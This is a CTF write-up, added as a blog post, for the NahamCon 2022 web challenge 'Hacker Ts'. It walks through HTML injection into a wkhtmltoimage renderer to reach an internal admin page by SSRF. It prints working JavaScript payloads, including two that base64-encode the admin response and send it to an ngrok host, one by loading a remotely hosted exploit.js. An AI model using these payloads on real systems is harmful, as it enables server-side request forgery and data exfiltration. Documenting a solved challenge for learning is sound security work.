@@ -1,0 +1,131 @@
+---
+title: "Hacker Ts challenge writeup"
+author: "0xMesbaha"
+cover: "/media/CTFs/Flag.png"
+tags: ["CTF", "html injection" ,"SSRF"]
+date: 2022-05-02T12:49:18+34:08
+draft: false
+---
+
+Nahamcon ctf 2022 was held from the 28th of April Until the 30th of the month , and we have participated under the team 0xcha0s. this challenge idea was pretty new to me so it is helpful to document it in this writeup
+<!--more-->
+
+|||
+| ----------- | ----------- |
+| CTF name  | [NahamconCTF 2022](https://www.nahamcon.com/) |
+| challenge    | Hacker Ts|
+| category   | web        |
+|about| HTML injection|
+|  team | [0xCha0s](https://ctftime.org/team/168238) |
+
+we are introduced with this page , it can take a text as input and we can also specify the color
+
+![error](/media/CTFs/Hacker-Ts/20220430232105.png)
+
+- and the output is :
+
+![error](/media/CTFs/Hacker-Ts/20220430232158.png)
+
+- Also we can see the **Admin** tab above it shows the following :
+
+![error](/media/CTFs/Hacker-Ts/20220430232228.png)
+
+- So our goal is to view the admin page , mentioning the ``localhost:5000`` should trigger you for SSRF most likely.
+
+- We can try to inject html code and see if it gets rendered ``<h1>test</h1>``
+
+![error](/media/CTFs/Hacker-Ts/20220430232530.png)
+
+- and it worked indeed , we can try to execute some JS , start with ``<script>alert(1);</script>`` But it shows empty t-shirt 
+- we can try :
+```html
+<p id="test">aa</p><script>document.getElementById('test').innerHTML+=window.location</script>
+```
+
+![error](/media/CTFs/Hacker-Ts/20220430233020.png)
+
+- we can try to trigger an error while processing to get more information with replacing ``test`` with ``X``
+
+
+![error](/media/CTFs/Hacker-Ts/20220430233123.png)
+
+- we got this error , we know it uses ``wkhtmltoimage`` to make the process , searching for it found the following articles :
+
+- [Nahmasec](https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent)
+- [here](https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f)
+- [Hacktricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)
+
+- we can craft payloads to make it visit the admin page and view the response for us :
+
+## Approach 1
+
+```html
+<h1 id=0xMesbaha></h1>
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET","http://localhost:5000/admin",false);
+xhr.send();
+document.getElementById('0xMesbaha').innerHTML = xhr.responseText;
+</script>
+```
+
+the false in ``xhr.open `` :
+
+```bash
+async parameter which is optional , If this value is false, the send() method does not return until the response is received.
+```
+
+
+![error](/media/CTFs/Hacker-Ts/20220430234539.png)
+
+
+## Approach 2
+
+- we can also use other payload to take the response then send it to remote server :
+- in the text input :
+```html
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET","http://localhost:5000/admin");
+xhr.onload = function(){
+    var flag = btoa(xhr.responseText);
+    var exfil = new XMLHttpRequest();
+    exfil.open("GET","http://ee3f-156-194-180-190.ngrok.io/?flag=" + flag);
+    exfil.send();
+};
+xhr.send();
+</script>
+```
+
+![error](/media/CTFs/Hacker-Ts/20220430235147.png)
+
+- decode it :
+
+![error](/media/CTFs/Hacker-Ts/20220430235227.png)
+
+## Approach 3
+
+
+- we can also go to another approach , which is hosting ``exploit.js`` contains :
+
+```javascript
+var xhr = new XMLHttpRequest();
+xhr.open("GET","http://localhost:5000/admin");
+xhr.onload = function(){
+    var flag = btoa(xhr.responseText);
+    var exfil = new XMLHttpRequest();
+    exfil.open("GET","http://6ce0-156-194-180-190.ngrok.io/?flag=" + flag);
+    exfil.send();
+};
+xhr.send();
+```
+
+- then on the text input use :
+
+```html
+<script src="http://6ce0-156-194-180-190.ngrok.io/exploit.js"></script>
+```
+
+- same output :
+
+![error](/media/CTFs/Hacker-Ts/20220430235602.png)
